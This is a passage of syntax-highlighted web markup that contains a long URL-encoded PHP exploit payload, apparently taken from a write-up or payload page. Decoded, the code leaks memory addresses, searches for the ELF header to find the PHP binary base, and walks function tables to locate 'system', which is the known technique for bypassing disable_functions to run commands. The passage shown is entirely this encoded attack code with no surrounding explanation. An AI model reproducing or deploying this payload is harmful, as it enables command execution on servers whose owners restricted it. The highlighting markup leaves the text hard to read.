class="hljs-number">65</span>%<span class="hljs-number">36</span>%<span class="hljs-number">66</span>%<span class="hljs-number">36</span>%<span class="hljs-number">33</span>%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">75</span>%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">75</span>%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">34</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">20</span>%<span class="hljs-number">26</span>%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">66</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">66</span>%<span class="hljs-number">20</span>%<span class="hljs-number">21</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">37</span>%<span class="hljs-number">38</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">36</span>%<span class="hljs-number">38</span>%<span class="hljs-number">33</span>%<span class="hljs-number">32</span>%<span class="hljs-number">36</span>%<span class="hljs-number">65</span>%<span class="hljs-number">36</span>%<span class="hljs-number">39</span>%<span class="hljs-number">36</span>%<span class="hljs-number">32</span>%<span class="hljs-number">29</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">75</span>%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">75</span>%<span class="hljs-number">65</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">64</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">38</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">66</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">72</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">74</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">30</span>%<span class="hljs-number">20</span>%<span class="hljs-number">2</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">69</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">37</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">36</span>%<span class="hljs-number">34</span>%<span class="hljs-number">63</span>%<span class="hljs-number">34</span>%<span class="hljs-number">35</span>%<span class="hljs-number">37</span>%<span class="hljs-number">66</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">72</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">75</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">74</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">20</span>%<span class="hljs-number">67</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">73</span>%<span class="hljs-number">79</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">73</span>%<span class="hljs-number">29</span>%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">62</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">69</span>%<span class="hljs-number">63</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">75</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">63</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">64</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">20</span>%<span class="hljs-number">7</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">66</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">61</span>%<span class="hljs-number">64</span>%<span class="hljs-number">64</span>%<span class="hljs-number">72</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>%<span class="hljs-number">66</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>b%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">66</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">74</span>%<span class="hljs-number">72</span>%<span class="hljs-number">79</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">2</span>c%<span class="hljs-number">20</span>%<span class="hljs-number">36</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>b%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>a%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">69</span>%<span class="hljs-number">66</span>%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>%<span class="hljs-number">66</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>d%<span class="hljs-number">3</span>d%<span class="hljs-number">20</span>%<span class="hljs-number">30</span>%<span class="hljs-number">78</span>%<span class="hljs-number">36</span>%<span class="hljs-number">64</span>%<span class="hljs-number">36</span>%<span class="hljs-number">35</span>%<span class="hljs-number">37</span>%<span class="hljs-number">34</span>%<span 